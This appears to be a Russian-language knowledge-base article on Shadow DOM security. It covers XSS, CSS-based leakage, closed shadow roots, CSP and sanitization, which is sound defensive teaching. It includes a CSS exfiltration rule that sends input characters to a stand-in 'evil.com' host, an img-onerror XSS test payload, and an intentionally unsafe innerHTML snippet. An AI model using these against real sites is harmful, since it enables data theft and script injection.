---
aliases: ["Security-Shadow-DOM", "Shadow-DOM-Security"]
tags: [security, web-components, shadow-dom]
---

# Безопасность Shadow DOM

## Введение

Shadow DOM - это технология веб-компонентов, которая позволяет создавать изолированные области DOM с собственными стилями и структурой. Хотя изоляция Shadow DOM предоставляет определенные преимущества безопасности, существуют и потенциальные уязвимости, которые разработчики должны учитывать при создании веб-компонентов.

## Архитектура Shadow DOM

Shadow DOM создает изолированное дерево DOM, которое инкапсулировано внутри элемента. Это дерево не видно из основного документа, что обеспечивает визуальную и стилистическую изоляцию. Однако, несмотря на эту изоляцию, существуют способы взаимодействия с содержимым Shadow DOM, что может привести к уязвимостям.

```html
<div id="host">
  <!-- Shadow DOM изолирован от основного DOM -->
  #shadow-root
    <style>/* Стили в Shadow DOM */</style>
    <p>Содержимое Shadow DOM</p>
</div>
```

## Потенциальные уязвимости

### 1. Уязвимости XSS в Shadow DOM

Поскольку Shadow DOM является частью веб-страницы, он подвержен тем же уязвимостям XSS, что и обычный DOM. Особенность в том, что XSS в Shadow DOM может быть сложнее обнаружить, так как содержимое изолировано от основного DOM.

```javascript
// Потенциально опасный код
const shadow = element.attachShadow({mode: 'open'});
shadow.innerHTML = `<div>${userInput}</div>`; // Уязвимость XSS
```

> [!warning] Важно
> Всегда проверяйте и очищайте пользовательский ввод перед вставкой в Shadow DOM, так как изоляция не защищает от XSS-атак.

### 2. Утечка данных через CSS

Несмотря на изоляцию, вредоносный CSS может использоваться для извлечения информации из Shadow DOM через техники, подобные CSS injection.

```css
/* Потенциально опасный CSS */
input[value$="1"]::after {
  background: url('http://evil.com/leak?char=1');
}
```

### 3. Нарушение изоляции через JavaScript

В некоторых случаях JavaScript может обойти изоляцию Shadow DOM, особенно если разработчики компонентов не уделяют должного внимания безопасности.

## Лучшие практики безопасности

### 1. Санитизация ввода

Всегда санируйте пользовательский ввод перед вставкой в Shadow DOM:

```javascript
import DOMPurify from 'dompurify';

const shadow = element.attachShadow({mode: 'open'});
const cleanHTML = DOMPurify.sanitize(userInput);
shadow.innerHTML = `<div>${cleanHTML}</div>`;
```

### 2. Использование Content Security Policy (CSP)

Реализуйте строгую политику CSP, которая ограничивает выполнение встроенных скриптов и стилей:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
```

### 3. Ограничение доступа к Shadow DOM

Не предоставляйте прямой доступ к ShadowRoot извне компонента, если это не обязательно:

```javascript
// Плохо - открытый доступ к Shadow DOM
class MyComponent extends HTMLElement {
  constructor() {
    super();
    this.shadow = this.attachShadow({mode: 'open'});
  }
  
  get shadowRoot() {
    return this.shadow; // Потенциальная уязвимость
  }
}

// Лучше - ограниченный доступ
class MyComponent extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({mode: 'closed'}); // Закрытый режим
  }
}
```

## Защита от атак

### 1. Защита от клик-джеркинга

Shadow DOM может использоваться для скрытия элементов интерфейса, что может быть использовано для клик-джеркинга. Убедитесь, что пользовательский интерфейс остается предсказуемым и прозрачным.

### 2. Контроль стилей

Ограничьте возможность внедрения пользовательских стилей в Shadow DOM:

```javascript
// Проверка и фильтрация CSS перед вставкой
function validateCSS(cssText) {
  // Реализация проверки CSS
  return sanitizedCSS;
}

const style = document.createElement('style');
style.textContent = validateCSS(userCSS);
shadow.appendChild(style);
```

## Проверка безопасности

### 1. Аудит Shadow DOM

Регулярно проводите аудит компонентов, использующих Shadow DOM, на наличие потенциальных уязвимостей:

- Проверьте все точки ввода данных
- Убедитесь в надлежащей санитизации
- Проверьте политику CSP
- Проверьте доступ к ShadowRoot

### 2. Тестирование на XSS

Тестируйте компоненты на уязвимости XSS, особенно в контексте изолированной природы Shadow DOM:

```javascript
// Тестирование на XSS в Shadow DOM
function testXSSInShadowDOM(component) {
  const testPayload = '<img src=x onerror="alert(\'XSS\')">';
  // Вставка тестового payload в компонент
  // Проверка выполнения скрипта
}
```

## Заключение

Shadow DOM предоставляет мощную модель изоляции, но разработчики должны быть осведомлены о потенциальных уязвимостях и принимать соответствующие меры безопасности. Ключевые моменты:

- Санитизация всех пользовательских данных
- Реализация строгой CSP
- Использование закрытого режима Shadow DOM при необходимости
- Регулярный аудит безопасности компонентов

> [!tip] Помните
> Изоляция Shadow DOM не заменяет другие меры безопасности. Она должна использоваться в сочетании с другими практиками безопасности веб-приложений.

## Связанные темы

- [[Безопасность-веб-компонентов]]
- [[Изоляция-компонентов]]
- [[Безопасность-настраиваемых-элементов]]
- [[XSS-атаки]]